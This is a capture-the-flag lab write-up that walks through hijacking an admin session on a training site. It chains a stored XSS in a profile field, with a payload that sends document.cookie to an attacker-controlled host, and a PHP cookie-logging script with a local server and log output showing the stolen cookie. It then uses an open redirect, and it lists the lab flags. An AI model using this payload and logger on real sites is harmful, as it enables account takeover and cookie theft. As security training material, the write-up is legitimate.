You are currently participating in a bug bounty program.

- The only URL in scope is`http://minilab.htb.net`
- Attacking end-users through client-side attacks is in scope for this particular bug bounty program.
- Test account credentials:
 - Email: heavycat106
 - Password: rocknrol
- Through dirbusting, you identified the following endpoint`http://minilab.htb.net/submit-solution`

Find a way to hijack an admin's session. Once you do that, answer the two questions below.

![Pasted image 20250219131413.png](../../../IMAGES/Pasted%20image%2020250219131413.png)
# First Question
---
Let's begin by checking the URL:

![Pasted image 20250219135123.png](../../../IMAGES/Pasted%20image%2020250219135123.png)

We can `Save`, `Share`, `Change Visibility` and `Delete`, we can begin by testing if the parameters are injectable to XSS:

![Pasted image 20250219135255.png](../../../IMAGES/Pasted%20image%2020250219135255.png)

Now, let's share:

![Pasted image 20250219135309.png](../../../IMAGES/Pasted%20image%2020250219135309.png)

There it is, it seems like the `Country` parameter is vulnerable to XSS, knowing this, we can craft a payload to get the admin credentials:

```js
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<TUN0IP>:PORT/index.php?c=' + document.cookie;"></video>
```

Next, create a `index.php` file with the following contents in it:

```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```

Let's start the server:

```php
php -S IP:PORT
```

Now, once we've done this, in order to simulate that the admin user's visited the site, we need to go back and view the other endpoint:

```
http://minilab.htb.net/submit-solution
```

If we visit this, the following happens:

![Pasted image 20250219135805.png](../../../IMAGES/Pasted%20image%2020250219135805.png)

So, we got an `Open Redirect`, we need to specify `?url=` and submit the URL we want to redirect too, we can do the following:

```http
minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com
```

And, we'll see the following in our php server:

```log
[Wed Feb 19 19:06:55 2025] 10.129.136.191:51172 Accepted
[Wed Feb 19 19:06:55 2025] 10.129.136.191:51172 [302]: GET /index.php?c=auth-session=s%3A5IchvLZHGiNrCoU0u1Swpgdlq6WWWBJh.%2BeZAaKIbOJPi3GGw%2BW8A3r0%2Bjdb%2B%2FsVawbUxIB8oUdU
[Wed Feb 19 19:06:55 2025] 10.129.136.191:51172 Closing
```

If we check the site, we can see this:

![Pasted image 20250219140213.png](../../../IMAGES/Pasted%20image%2020250219140213.png)

It was indeed the admin user and we got the `auth-session` cookie, we can now authenticate as admin:

![Pasted image 20250219140807.png](../../../IMAGES/Pasted%20image%2020250219140807.png)

If we refresh the page:

![Pasted image 20250219140815.png](../../../IMAGES/Pasted%20image%2020250219140815.png)

We are now admin user, let's make it public:

![Pasted image 20250219140839.png](../../../IMAGES/Pasted%20image%2020250219140839.png)

If we go to share, we can see this:

![Pasted image 20250219140922.png](../../../IMAGES/Pasted%20image%2020250219140922.png)

We get the first flag, also, the yellow icon that says `Flag2`, downloads the pcap file for the next question, first flag is:

```
[YOU_ARE_A_SESSION_WARRIOR]
```

# Second Question
---

Now, let's open the pcap file:

![Pasted image 20250219142017.png](../../../IMAGES/Pasted%20image%2020250219142017.png)

We can filter:

![Pasted image 20250219142255.png](../../../IMAGES/Pasted%20image%2020250219142255.png)

We can see it selects the `Get /?redirect_uri` packet, if we open it, we can see this:

![Pasted image 20250219142323.png](../../../IMAGES/Pasted%20image%2020250219142323.png)

We got our flag:

```
FLAG{SUCCESS_YOU_PWN3D_US_H0PE_YOU_ENJ0YED}
```

![Pasted image 20250219142344.png](../../../IMAGES/Pasted%20image%2020250219142344.png)

